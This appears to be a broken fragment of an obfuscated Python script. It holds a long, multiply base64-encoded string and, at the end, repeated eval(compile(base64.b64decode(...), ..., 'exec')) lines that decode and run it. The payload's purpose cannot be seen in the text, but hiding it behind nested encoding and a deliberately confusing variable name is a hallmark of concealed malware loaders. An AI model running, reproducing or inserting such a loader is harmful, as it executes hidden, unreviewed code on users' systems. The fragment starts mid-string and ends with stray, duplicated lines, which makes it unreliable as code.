SVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDVDBkTmVWUnViR2hYUlVsM1UxVm9UMlZXYkRaTlIyeE5UVEpTYzFkWGF6VmxiVkpJVW1wQ2FGWXdNVEpaYTJSellWVjNlV05JYUd0V01WbzFXbFpOTldOWFRsbFdiWGhxWW0xME1WbFhOVTVoVld4SlZXcFdhbEl4VlRWVFZ6VlRZa2RXU1ZWWVdtaGlWVmw1VjFab1QyRnRUblJpU0dSclVUQnJjbFZGVFRWbGJHdDZVMjVDYWxOR1JYSlJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJGTkZSRVNtOWlSbXhZVlZOMFJHRlZSbTVUVlU1Q1dqQnNSRkZYWkZGU01IQXlWMnRvY2xveGEzbGxSMmhxVFRBd05WTlhNVTlrYlVwMVZXMW9hRlo2Vm5OWk1teEtTekZDU0ZWdVFtdGhWVXB4V1d0a1IyVnRUalpOUjJ4cVlsUnJlbE5YYnpCVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVlNOR0V5UmxsWFYyUmFUVzVvYjFsNlRrNVBWV3gxVlcxNGJGTkdSakJYVkVwWFpGZFNTRlp1YkVwaGFsSk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUldWSVFtbFdNazV1V1hwT1MyRnNRbFJUV0ZwclVqSm9jMWxzWkZkYWJVMTVVbTF3YW1KVldqQlhiR014VFVkU1dFMUlXbXBOTVVwdldrVmtjMkZyZDNwVWJteGFaVlJzZDFsc1pHcGtiVXBJVDFjMWFXVlVWak5aYlRGcVlWWkNibUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTVVKRVQxZDBhRmRHYTNKUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkZORmRyWkhOTmEyeElWRzVPV2xkRk5UWlZSazVMVFVad1dXRkVRazFXTURWeldXMDFVMkpIVG5CVFUzUkVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVWVVZrYm1WV1FuSlZSVko2VFd4S2QxZHFTVFJhTVhCSVZsZGthbUpXV25WWlZtaFBUVWRPZEU5SFpHaFdlbFp4V1dwT1MyVldjRmhVYWtKcFpWUlJORlJFU201bFZrSnhaVWRzYW1GVVozSlJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNVUpKVlcxb1dtSllhSE5WUjNBMFRVZE9jVTVGZEVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3UlRSYVJXUlNTekZDU0ZkdVdtbGliRVp1VjFSSk5XTXlTWHBUVkd4S1ltMVNkbGxXYUZOaVJXeHhUa2hXVFdGVVVqRlVSMnN3WkZWNGNFNUlWazFoVkZJeFZFZHJNR1JWZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRnVaREpYYlRBMVpGZFNSVTVFYUUxTk1VcHlWVWRrZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUldWRVFtRlNSRkUwVjIwd05XUlhVa1JSYlhCcFRXNW9NbGt5YjNkaFYxRjVZVWhDYTFJeFZuQlZSMnN3WkZWNGNFNUlWazFoVkZJeFZFZHJNR1JWZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGWkNSRTlYTVdsTmFsVjNWVWR3TTJSdFVraFZVM1JFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VlVWb1UyRXhRbkZsUnpGcFRXcFZkMU5WWkU5a2JVcElUMWhzVVZVd2IzcFpWV1J6VFVad1ZGTlRkRTFoVkZJeFZFZHJNR1JWZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGVjRjRTVJVmsxaFZGRTBWRVJLWVdSdFNuVlZVM1JSVVhwcmQxZHJVVEJUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVkdoclVqRkZjbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVa2hvZGxSclVUQlBSbXh4VGxWV1dsZEdTakpaTTJ4RFlURndWRkZ0Y0dsTmFsVjNWMVprVDAxSFNqWmllbWhOVFd0cmNsVkZUVFZpTURWRlRrVjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1VSklXbnBDVVdGdWFIcFpWbEV4VWtkSmVsTnViR0ZXZW1odVYyeGtOR0pHYTNwVmJtd3pUakExTVZsV1pFOWthemx3VVdwU2JGTkhaekJhVldodlRrWkdTV0ZFVW14VFIyY3dXbFZvYjA1SFZrUk9WRkpzVTBka01WcFZhRzVQUlhkNVpVaENVV0Z1WkRKWlZWSlNTekJPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVkkwWWpBMVJVNUVhR2xTTW5OeVZtdGtWMk16WXpKaVJ6RnBUV3BXTWxReWJFSmlNSFEyVmxod1RGVXdSWGhVVjNCS1pVVXhObGw2Ums5Uk1GSkZZek5zUW1Jd2REWldXSEJNVlRCRmVGUXdVbTVsUlRWVlZsaGtVRkpJWkRKWmEyUnlTekZDUkU5WE9VOVNSRkpNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDVXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZSb1RVMHhTbkpWUjNBelpHMVNTVk5UZEZGUmVtdDNWMVprUzJNeGNGVk9SWFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUldReldtRlNNbmQ1VlVka2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVZSV1JUWTBkU2NGRnRjR2xTTUZvMldUTnZkMkZYVWtoV2FsSnJVWHBHY1Zkc1l6Rk5SbkJaVTFkc1VWb3lPVzVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZValJoUld4SVlVaHNZVll4YXpWVFYyeFhaV3RzY1U1V1pHbE5ibWQ1VjJ4b1Nsb3hiRmhrTW1Sb1ZucFdkMWRVU25Oa2EyeElWVzE0U2xORk5YTlpla3AxVWtoTmVVNUVhRTFOYTFWeVVUSnNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSVFJVUkVwVFkwZFNjVTVGZEVwUk1FWnVVMVZPUWxvd2JFUlJWR2hOVFd4S2QxcEhiekJQUlhkNVUyNWFZVk5IYzNKVlJVMDFZakpTU0UxWVRsRmhWV3h3VTFkc1ZtSXlVWGxXYm14b1RUTkNjMXBHWkdwa1YxSlpVMjVPV1Uwd1dYaFphazVUWWtabmVsRnVUbXRYUlRGMlUxY3hOR1JzYjNsaVNGWktZVmQwZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVaTWpGWFRVZFNXVk51VmtwVFJYQnpXWHBPVjJNeVVrSlFWREJwUTIxV01sbFhkMjlaTWpsMFkwZHNjMXBUYUdsWldFNXNUbXBSZFZscVdUQmFSMVpxWWpKU2JFdEhPVkJVZWtKMllqSTVVRlI1YTNOSlEwazRZek5TZVdGWE5XNVFhVWx6U1VOa2JHVkhWbXBLZVd0d0lncGxkbUZzS0dOdmJYQnBiR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h2VDA4d2IyOXZUMDhwTENBaVBITjBjbWx1Wno0aUxDQW5aWGhsWXljcEtRPT0iCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))